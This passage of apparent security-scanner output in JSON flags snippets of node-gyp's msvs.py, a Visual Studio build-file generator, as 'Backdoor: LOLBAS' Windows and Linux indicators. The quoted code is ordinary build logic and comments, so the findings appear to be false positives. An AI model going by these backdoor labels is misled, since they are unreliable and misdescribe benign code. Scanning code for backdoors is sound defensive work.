                      "markdown": "`        if direct_cmd.find(\"OUTDIR\") >= 0:\n            cmd += \"set OUTDIR=$(OutDir)&& \"\n        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 407,
                  "startColumn": 11,
                  "endLine": 407,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        if direct_cmd.find(\"INTDIR\") >= 0:\n            cmd += \"set INTDIR=$(IntDir)&& \"\n        if direct_cmd.find(\"OUTDIR\") >= 0:\n            cmd += \"set OUTDIR=$(OutDir)&& \"\n        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n",
                    "rendered": {
                      "text": "        if direct_cmd.find(\"INTDIR\") >= 0:\n            cmd += \"set INTDIR=$(IntDir)&& \"\n        if direct_cmd.find(\"OUTDIR\") >= 0:\n            cmd += \"set OUTDIR=$(OutDir)&& \"\n        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n",
                      "markdown": "`        if direct_cmd.find(\"INTDIR\") >= 0:\n            cmd += \"set INTDIR=$(IntDir)&& \"\n        if direct_cmd.find(\"OUTDIR\") >= 0:\n            cmd += \"set OUTDIR=$(OutDir)&& \"\n        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 405,
                  "startColumn": 11,
                  "endLine": 405,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        if direct_cmd.find(\"NUMBER_OF_PROCESSORS\") >= 0:\n            cmd += \"set /a NUMBER_OF_PROCESSORS_PLUS_1=%%NUMBER_OF_PROCESSORS%%+1&& \"\n        if direct_cmd.find(\"INTDIR\") >= 0:\n            cmd += \"set INTDIR=$(IntDir)&& \"\n        if direct_cmd.find(\"OUTDIR\") >= 0:\n            cmd += \"set OUTDIR=$(OutDir)&& \"\n        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n",
                    "rendered": {
                      "text": "        if direct_cmd.find(\"NUMBER_OF_PROCESSORS\") >= 0:\n            cmd += \"set /a NUMBER_OF_PROCESSORS_PLUS_1=%%NUMBER_OF_PROCESSORS%%+1&& \"\n        if direct_cmd.find(\"INTDIR\") >= 0:\n            cmd += \"set INTDIR=$(IntDir)&& \"\n        if direct_cmd.find(\"OUTDIR\") >= 0:\n            cmd += \"set OUTDIR=$(OutDir)&& \"\n        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n",
                      "markdown": "`        if direct_cmd.find(\"NUMBER_OF_PROCESSORS\") >= 0:\n            cmd += \"set /a NUMBER_OF_PROCESSORS_PLUS_1=%%NUMBER_OF_PROCESSORS%%+1&& \"\n        if direct_cmd.find(\"INTDIR\") >= 0:\n            cmd += \"set INTDIR=$(IntDir)&& \"\n        if direct_cmd.find(\"OUTDIR\") >= 0:\n            cmd += \"set OUTDIR=$(OutDir)&& \"\n        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 403,
                  "startColumn": 11,
                  "endLine": 403,
                  "endColumn": 16,
                  "snippet": {
                    "text": "            cmd += 'call \"$(ProjectDir)%(cygwin_dir)s\\\\setup_env.bat\" && '\n        cmd += \"set CYGWIN=nontsec&& \"\n        if direct_cmd.find(\"NUMBER_OF_PROCESSORS\") >= 0:\n            cmd += \"set /a NUMBER_OF_PROCESSORS_PLUS_1=%%NUMBER_OF_PROCESSORS%%+1&& \"\n        if direct_cmd.find(\"INTDIR\") >= 0:\n            cmd += \"set INTDIR=$(IntDir)&& \"\n        if direct_cmd.find(\"OUTDIR\") >= 0:\n",
                    "rendered": {
                      "text": "            cmd += 'call \"$(ProjectDir)%(cygwin_dir)s\\\\setup_env.bat\" && '\n        cmd += \"set CYGWIN=nontsec&& \"\n        if direct_cmd.find(\"NUMBER_OF_PROCESSORS\") >= 0:\n            cmd += \"set /a NUMBER_OF_PROCESSORS_PLUS_1=%%NUMBER_OF_PROCESSORS%%+1&& \"\n        if direct_cmd.find(\"INTDIR\") >= 0:\n            cmd += \"set INTDIR=$(IntDir)&& \"\n        if direct_cmd.find(\"OUTDIR\") >= 0:\n",
                      "markdown": "`            cmd += 'call \"$(ProjectDir)%(cygwin_dir)s\\\\setup_env.bat\" && '\n        cmd += \"set CYGWIN=nontsec&& \"\n        if direct_cmd.find(\"NUMBER_OF_PROCESSORS\") >= 0:\n            cmd += \"set /a NUMBER_OF_PROCESSORS_PLUS_1=%%NUMBER_OF_PROCESSORS%%+1&& \"\n        if direct_cmd.find(\"INTDIR\") >= 0:\n            cmd += \"set INTDIR=$(IntDir)&& \"\n        if direct_cmd.find(\"OUTDIR\") >= 0:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 401,
                  "startColumn": 7,
                  "endLine": 401,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        cmd = \"\"\n        if do_setup_env:\n            cmd += 'call \"$(ProjectDir)%(cygwin_dir)s\\\\setup_env.bat\" && '\n        cmd += \"set CYGWIN=nontsec&& \"\n        if direct_cmd.find(\"NUMBER_OF_PROCESSORS\") >= 0:\n            cmd += \"set /a NUMBER_OF_PROCESSORS_PLUS_1=%%NUMBER_OF_PROCESSORS%%+1&& \"\n        if direct_cmd.find(\"INTDIR\") >= 0:\n",
                    "rendered": {
                      "text": "        cmd = \"\"\n        if do_setup_env:\n            cmd += 'call \"$(ProjectDir)%(cygwin_dir)s\\\\setup_env.bat\" && '\n        cmd += \"set CYGWIN=nontsec&& \"\n        if direct_cmd.find(\"NUMBER_OF_PROCESSORS\") >= 0:\n            cmd += \"set /a NUMBER_OF_PROCESSORS_PLUS_1=%%NUMBER_OF_PROCESSORS%%+1&& \"\n        if direct_cmd.find(\"INTDIR\") >= 0:\n",
                      "markdown": "`        cmd = \"\"\n        if do_setup_env:\n            cmd += 'call \"$(ProjectDir)%(cygwin_dir)s\\\\setup_env.bat\" && '\n        cmd += \"set CYGWIN=nontsec&& \"\n        if direct_cmd.find(\"NUMBER_OF_PROCESSORS\") >= 0:\n            cmd += \"set /a NUMBER_OF_PROCESSORS_PLUS_1=%%NUMBER_OF_PROCESSORS%%+1&& \"\n        if direct_cmd.find(\"INTDIR\") >= 0:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 400,
                  "startColumn": 11,
                  "endLine": 400,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        # TODO(quote):  regularize quoting path names throughout the module\n        cmd = \"\"\n        if do_setup_env:\n            cmd += 'call \"$(ProjectDir)%(cygwin_dir)s\\\\setup_env.bat\" && '\n        cmd += \"set CYGWIN=nontsec&& \"\n        if direct_cmd.find(\"NUMBER_OF_PROCESSORS\") >= 0:\n            cmd += \"set /a NUMBER_OF_PROCESSORS_PLUS_1=%%NUMBER_OF_PROCESSORS%%+1&& \"\n",
                    "rendered": {
                      "text": "        # TODO(quote):  regularize quoting path names throughout the module\n        cmd = \"\"\n        if do_setup_env:\n            cmd += 'call \"$(ProjectDir)%(cygwin_dir)s\\\\setup_env.bat\" && '\n        cmd += \"set CYGWIN=nontsec&& \"\n        if direct_cmd.find(\"NUMBER_OF_PROCESSORS\") >= 0:\n            cmd += \"set /a NUMBER_OF_PROCESSORS_PLUS_1=%%NUMBER_OF_PROCESSORS%%+1&& \"\n",
                      "markdown": "`        # TODO(quote):  regularize quoting path names throughout the module\n        cmd = \"\"\n        if do_setup_env:\n            cmd += 'call \"$(ProjectDir)%(cygwin_dir)s\\\\setup_env.bat\" && '\n        cmd += \"set CYGWIN=nontsec&& \"\n        if direct_cmd.find(\"NUMBER_OF_PROCESSORS\") >= 0:\n            cmd += \"set /a NUMBER_OF_PROCESSORS_PLUS_1=%%NUMBER_OF_PROCESSORS%%+1&& \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 398,
                  "startColumn": 7,
                  "endLine": 398,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        # direct_cmd = gyp.common.EncodePOSIXShellList(direct_cmd)\n        direct_cmd = \" \".join(direct_cmd)\n        # TODO(quote):  regularize quoting path names throughout the module\n        cmd = \"\"\n        if do_setup_env:\n            cmd += 'call \"$(ProjectDir)%(cygwin_dir)s\\\\setup_env.bat\" && '\n        cmd += \"set CYGWIN=nontsec&& \"\n",
                    "rendered": {
                      "text": "        # direct_cmd = gyp.common.EncodePOSIXShellList(direct_cmd)\n        direct_cmd = \" \".join(direct_cmd)\n        # TODO(quote):  regularize quoting path names throughout the module\n        cmd = \"\"\n        if do_setup_env:\n            cmd += 'call \"$(ProjectDir)%(cygwin_dir)s\\\\setup_env.bat\" && '\n        cmd += \"set CYGWIN=nontsec&& \"\n",
                      "markdown": "`        # direct_cmd = gyp.common.EncodePOSIXShellList(direct_cmd)\n        direct_cmd = \" \".join(direct_cmd)\n        # TODO(quote):  regularize quoting path names throughout the module\n        cmd = \"\"\n        if do_setup_env:\n            cmd += 'call \"$(ProjectDir)%(cygwin_dir)s\\\\setup_env.bat\" && '\n        cmd += \"set CYGWIN=nontsec&& \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 379,
                  "startColumn": 20,
                  "endLine": 380,
                  "snippet": {
                    "text": "        # Find path to cygwin.\n        cygwin_dir = _FixPath(spec.get(\"msvs_cygwin_dirs\", [\".\"])[0])\n        # Prepare command.\n        direct_cmd = cmd\n        direct_cmd = [\n            i.replace(\"$(IntDir)\", '`cygpath -m \"${INTDIR}\"`') for i in direct_cmd\n        ]\n        direct_cmd = [\n",
                    "rendered": {
                      "text": "        # Find path to cygwin.\n        cygwin_dir = _FixPath(spec.get(\"msvs_cygwin_dirs\", [\".\"])[0])\n        # Prepare command.\n        direct_cmd = cmd\n        direct_cmd = [\n            i.replace(\"$(IntDir)\", '`cygpath -m \"${INTDIR}\"`') for i in direct_cmd\n        ]\n        direct_cmd = [\n",
                      "markdown": "`        # Find path to cygwin.\n        cygwin_dir = _FixPath(spec.get(\"msvs_cygwin_dirs\", [\".\"])[0])\n        # Prepare command.\n        direct_cmd = cmd\n        direct_cmd = [\n            i.replace(\"$(IntDir)\", '`cygpath -m \"${INTDIR}\"`') for i in direct_cmd\n        ]\n        direct_cmd = [\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 366,
                  "startColumn": 18,
                  "endLine": 366,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    spec, cmd, cygwin_shell, has_input_path, quote_cmd, do_setup_env\n):\n\n    if [x for x in cmd if \"$(InputDir)\" in x]:\n        input_dir_preamble = (\n            \"set INPUTDIR=$(InputDir)\\n\"\n            \"if NOT DEFINED INPUTDIR set INPUTDIR=.\\\\\\n\"\n",
                    "rendered": {
                      "text": "    spec, cmd, cygwin_shell, has_input_path, quote_cmd, do_setup_env\n):\n\n    if [x for x in cmd if \"$(InputDir)\" in x]:\n        input_dir_preamble = (\n            \"set INPUTDIR=$(InputDir)\\n\"\n            \"if NOT DEFINED INPUTDIR set INPUTDIR=.\\\\\\n\"\n",
                      "markdown": "`    spec, cmd, cygwin_shell, has_input_path, quote_cmd, do_setup_env\n):\n\n    if [x for x in cmd if \"$(InputDir)\" in x]:\n        input_dir_preamble = (\n            \"set INPUTDIR=$(InputDir)\\n\"\n            \"if NOT DEFINED INPUTDIR set INPUTDIR=.\\\\\\n\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 140,
                  "startColumn": 53,
                  "endLine": 140,
                  "endColumn": 61,
                  "snippet": {
                    "text": "def _NormalizedSource(source):\n    \"\"\"Normalize the path.\n\n  But not if that gets rid of a variable, as this may expand to something\n  larger than one directory.\n\n  Arguments:\n",
                    "rendered": {
                      "text": "def _NormalizedSource(source):\n    \"\"\"Normalize the path.\n\n  But not if that gets rid of a variable, as this may expand to something\n  larger than one directory.\n\n  Arguments:\n",
                      "markdown": "`def _NormalizedSource(source):\n    \"\"\"Normalize the path.\n\n  But not if that gets rid of a variable, as this may expand to something\n  larger than one directory.\n\n  Arguments:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3430,
                  "startColumn": 36,
                  "endLine": 3430,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    if spec.get(\"msvs_requires_importlibrary\"):\n        _ToolAppend(msbuild_settings, \"\", \"IgnoreImportLibrary\", \"false\")\n    # Loadable modules don't generate import libraries;\n    # tell dependent projects to not expect one.\n    if spec[\"type\"] == \"loadable_module\":\n        _ToolAppend(msbuild_settings, \"\", \"IgnoreImportLibrary\", \"true\")\n    # Set the module definition file if any.\n",
                    "rendered": {
                      "text": "    if spec.get(\"msvs_requires_importlibrary\"):\n        _ToolAppend(msbuild_settings, \"\", \"IgnoreImportLibrary\", \"false\")\n    # Loadable modules don't generate import libraries;\n    # tell dependent projects to not expect one.\n    if spec[\"type\"] == \"loadable_module\":\n        _ToolAppend(msbuild_settings, \"\", \"IgnoreImportLibrary\", \"true\")\n    # Set the module definition file if any.\n",
                      "markdown": "`    if spec.get(\"msvs_requires_importlibrary\"):\n        _ToolAppend(msbuild_settings, \"\", \"IgnoreImportLibrary\", \"false\")\n    # Loadable modules don't generate import libraries;\n    # tell dependent projects to not expect one.\n    if spec[\"type\"] == \"loadable_module\":\n        _ToolAppend(msbuild_settings, \"\", \"IgnoreImportLibrary\", \"true\")\n    # Set the module definition file if any.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3300,
                  "startColumn": 53,
                  "endLine": 3300,
                  "endColumn": 59,
                  "snippet": {
                    "text": "        return edges\n\n    properties_ordered = gyp.common.TopologicallySorted(properties.keys(), GetEdges)\n    # Walk properties in the reverse of a topological sort on\n    # user_of_variable -> used_variable as this ensures variables are\n    # defined before they are used.\n    # NOTE: reverse(topsort(DAG)) = topsort(reverse_edges(DAG))\n",
                    "rendered": {
                      "text": "        return edges\n\n    properties_ordered = gyp.common.TopologicallySorted(properties.keys(), GetEdges)\n    # Walk properties in the reverse of a topological sort on\n    # user_of_variable -> used_variable as this ensures variables are\n    # defined before they are used.\n    # NOTE: reverse(topsort(DAG)) = topsort(reverse_edges(DAG))\n",
                      "markdown": "`        return edges\n\n    properties_ordered = gyp.common.TopologicallySorted(properties.keys(), GetEdges)\n    # Walk properties in the reverse of a topological sort on\n    # user_of_variable -> used_variable as this ensures variables are\n    # defined before they are used.\n    # NOTE: reverse(topsort(DAG)) = topsort(reverse_edges(DAG))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3294,
                  "startColumn": 47,
                  "endLine": 3295,
                  "snippet": {
                    "text": "                {\n                    v\n                    for v in MSVS_VARIABLE_REFERENCE.findall(value)\n                    if v in properties and v != node\n                }\n            )\n        return edges\n\n",
                    "rendered": {
                      "text": "                {\n                    v\n                    for v in MSVS_VARIABLE_REFERENCE.findall(value)\n                    if v in properties and v != node\n                }\n            )\n        return edges\n\n",
                      "markdown": "`                {\n                    v\n                    for v in MSVS_VARIABLE_REFERENCE.findall(value)\n                    if v in properties and v != node\n                }\n            )\n        return edges\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1860,
                  "startColumn": 24,
                  "endLine": 1860,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        gyp_dir = os.path.dirname(gyp_file)\n        path_dict = _GetPathDict(root, gyp_dir)\n        path_dict[target + \".vcproj\"] = project_objects[p]\n    # Walk down from the top until we hit a folder that has more than one entry.\n    # In practice, this strips the top-level \"src/\" dir from the hierarchy in\n    # the solution.\n    while len(root) == 1 and type(root[next(iter(root))]) == dict:\n",
                    "rendered": {
                      "text": "        gyp_dir = os.path.dirname(gyp_file)\n        path_dict = _GetPathDict(root, gyp_dir)\n        path_dict[target + \".vcproj\"] = project_objects[p]\n    # Walk down from the top until we hit a folder that has more than one entry.\n    # In practice, this strips the top-level \"src/\" dir from the hierarchy in\n    # the solution.\n    while len(root) == 1 and type(root[next(iter(root))]) == dict:\n",
                      "markdown": "`        gyp_dir = os.path.dirname(gyp_file)\n        path_dict = _GetPathDict(root, gyp_dir)\n        path_dict[target + \".vcproj\"] = project_objects[p]\n    # Walk down from the top until we hit a folder that has more than one entry.\n    # In practice, this strips the top-level \"src/\" dir from the hierarchy in\n    # the solution.\n    while len(root) == 1 and type(root[next(iter(root))]) == dict:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1847,
                  "startColumn": 10,
                  "endLine": 1848,
                  "snippet": {
                    "text": "        return node\n    for child in node:\n        node[child] = _CollapseSingles(child, node[child])\n    return node\n\n\ndef _GatherSolutionFolders(sln_projects, project_objects, flat):\n    root = {}\n",
                    "rendered": {
                      "text": "        return node\n    for child in node:\n        node[child] = _CollapseSingles(child, node[child])\n    return node\n\n\ndef _GatherSolutionFolders(sln_projects, project_objects, flat):\n    root = {}\n",
                      "markdown": "`        return node\n    for child in node:\n        node[child] = _CollapseSingles(child, node[child])\n    return node\n\n\ndef _GatherSolutionFolders(sln_projects, project_objects, flat):\n    root = {}\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1844,
                  "startColumn": 14,
                  "endLine": 1845,
                  "snippet": {
                    "text": "    if type(node) == dict and len(node) == 1 and next(iter(node)) == parent + \".vcproj\":\n        return node[next(iter(node))]\n    if type(node) != dict:\n        return node\n    for child in node:\n        node[child] = _CollapseSingles(child, node[child])\n    return node\n\n",
                    "rendered": {
                      "text": "    if type(node) == dict and len(node) == 1 and next(iter(node)) == parent + \".vcproj\":\n        return node[next(iter(node))]\n    if type(node) != dict:\n        return node\n    for child in node:\n        node[child] = _CollapseSingles(child, node[child])\n    return node\n\n",
                      "markdown": "`    if type(node) == dict and len(node) == 1 and next(iter(node)) == parent + \".vcproj\":\n        return node[next(iter(node))]\n    if type(node) != dict:\n        return node\n    for child in node:\n        node[child] = _CollapseSingles(child, node[child])\n    return node\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1560,
                  "startColumn": 5,
                  "endLine": 1560,
                  "endColumn": 11,
                  "snippet": {
                    "text": "    excluded_idl = _IdlFilesHandledNonNatively(spec, sources)\n\n    precompiled_related = _GetPrecompileRelatedFiles(spec)\n    # Find the excluded ones, minus the precompiled header related ones.\n    fully_excluded = [i for i in excluded_sources if i not in precompiled_related]\n\n    # Convert to folders and the right slashes.\n",
                    "rendered": {
                      "text": "    excluded_idl = _IdlFilesHandledNonNatively(spec, sources)\n\n    precompiled_related = _GetPrecompileRelatedFiles(spec)\n    # Find the excluded ones, minus the precompiled header related ones.\n    fully_excluded = [i for i in excluded_sources if i not in precompiled_related]\n\n    # Convert to folders and the right slashes.\n",
                      "markdown": "`    excluded_idl = _IdlFilesHandledNonNatively(spec, sources)\n\n    precompiled_related = _GetPrecompileRelatedFiles(spec)\n    # Find the excluded ones, minus the precompiled header related ones.\n    fully_excluded = [i for i in excluded_sources if i not in precompiled_related]\n\n    # Convert to folders and the right slashes.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1262,
                  "startColumn": 36,
                  "endLine": 1262,
                  "endColumn": 42,
                  "snippet": {
                    "text": "    The list of directory paths.\n  \"\"\"\n    # TODO(bradnelson): include_dirs should really be flexible enough not to\n    #                   require this sort of thing.\n    include_dirs = config.get(\"include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n",
                    "rendered": {
                      "text": "    The list of directory paths.\n  \"\"\"\n    # TODO(bradnelson): include_dirs should really be flexible enough not to\n    #                   require this sort of thing.\n    include_dirs = config.get(\"include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n",
                      "markdown": "`    The list of directory paths.\n  \"\"\"\n    # TODO(bradnelson): include_dirs should really be flexible enough not to\n    #                   require this sort of thing.\n    include_dirs = config.get(\"include_dirs\", []) + config.get(\n        \"msvs_system_include_dirs\", []\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1242,
                  "startColumn": 36,
                  "endLine": 1242,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        )\n        _ToolAppend(tools, \"VCCLCompilerTool\", \"ForcedIncludeFiles\", precompiled_header)\n    # Loadable modules don't generate import libraries;\n    # tell dependent projects to not expect one.\n    if spec[\"type\"] == \"loadable_module\":\n        _ToolAppend(tools, \"VCLinkerTool\", \"IgnoreImportLibrary\", \"true\")\n    # Set the module definition file if any.\n",
                    "rendered": {
                      "text": "        )\n        _ToolAppend(tools, \"VCCLCompilerTool\", \"ForcedIncludeFiles\", precompiled_header)\n    # Loadable modules don't generate import libraries;\n    # tell dependent projects to not expect one.\n    if spec[\"type\"] == \"loadable_module\":\n        _ToolAppend(tools, \"VCLinkerTool\", \"IgnoreImportLibrary\", \"true\")\n    # Set the module definition file if any.\n",
                      "markdown": "`        )\n        _ToolAppend(tools, \"VCCLCompilerTool\", \"ForcedIncludeFiles\", precompiled_header)\n    # Loadable modules don't generate import libraries;\n    # tell dependent projects to not expect one.\n    if spec[\"type\"] == \"loadable_module\":\n        _ToolAppend(tools, \"VCLinkerTool\", \"IgnoreImportLibrary\", \"true\")\n    # Set the module definition file if any.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
